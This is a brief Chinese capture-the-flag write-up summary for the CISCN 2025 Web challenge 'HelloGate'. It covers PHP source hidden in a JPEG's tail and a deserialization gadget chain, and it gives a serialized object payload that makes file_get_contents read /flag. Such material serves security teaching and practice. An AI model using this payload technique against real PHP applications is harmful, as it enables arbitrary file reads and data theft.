---
title: "HelloGate"
competition: "全国大学生信息安全竞赛"
year: 2025
category: "Web"
tags:
  - "响应图片尾部藏 PHP 源码"
  - "反序列化：`A::triggerMethod` → `B::__toString` → `C::__get` → `file_get_contents`"
sources:
  - "https://moyuin.top/blog/%E9%95%BF%E5%9F%8E%E6%9D%AF%20WriteUP"
  - "https://godownio.github.io/2025/12/20/2025-ciscn-chu-sai-wp-by-yp0int/"
---
# HelloGate

## 题目信息
- 赛事：CISCN 2025 初赛
- 分类：Web

## 考点
- 响应图片尾部藏 PHP 源码
- 反序列化：`A::triggerMethod` → `B::__toString` → `C::__get` → `file_get_contents`

## 解题思路
1. 抓包或看下载的 jpeg 尾部得到源码：`unserialize($_POST['data'])` 后调用 `triggerMethod`。
2. 构造 A→B→C 链，令 `C::$cmd` 为 `/flag` 或 `php://filter/...`，POST 即可读 flag。

## 关键代码/payload
```php
O:1:"A":1:{s:6:"handle";O:1:"B":1:{s:6:"worker";O:1:"C":1:{s:3:"cmd";s:5:"/flag";}}}
```

## 参考链接
- https://moyuin.top/blog/%E9%95%BF%E5%9F%8E%E6%9D%AF%20WriteUP
- https://godownio.github.io/2025/12/20/2025-ciscn-chu-sai-wp-by-yp0int/

> 本文为对公开 writeup 的归纳总结，版权归原作者所有；请务必阅读原文核对细节。
